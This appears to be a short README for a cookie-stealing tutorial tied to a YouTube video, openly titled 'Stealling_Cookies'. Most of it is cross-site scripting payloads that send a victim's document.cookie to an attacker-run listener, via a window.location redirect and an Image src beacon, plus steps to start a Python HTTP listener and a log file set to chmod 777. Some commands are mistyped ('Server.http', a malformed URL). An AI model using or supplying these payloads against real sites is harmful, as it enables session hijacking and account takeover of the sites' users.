# Stealling_Cookies
in This file you will find every thing you need to Steal the cookies

All Payload that used in the Youtube Video:

https://youtu.be/Kh1sgI5yLdk


Payloads:

# Takeing The Cookie From Python3 Server Listener:

1- Strat Python Server:

YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!

2- write Payload with window.location() function:

<script> window.location='https://127.0.0.1/:3333?cookie='+document.cookie </script> 


# Send Cookies with out go another Window :

1- Strat Python Server:

YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!

2- write the Pyaload:

<script>
    var i = new Image();
    i.src="http://127.0.0.1:3333/?cookie="+document.cookie
</script>  


# Wirte PHP Code To Take the Cookie:

1- make the get.php:

2- make log.txt

3- give all Privileges:

YasserREED> sudo chmod 777 log.txt


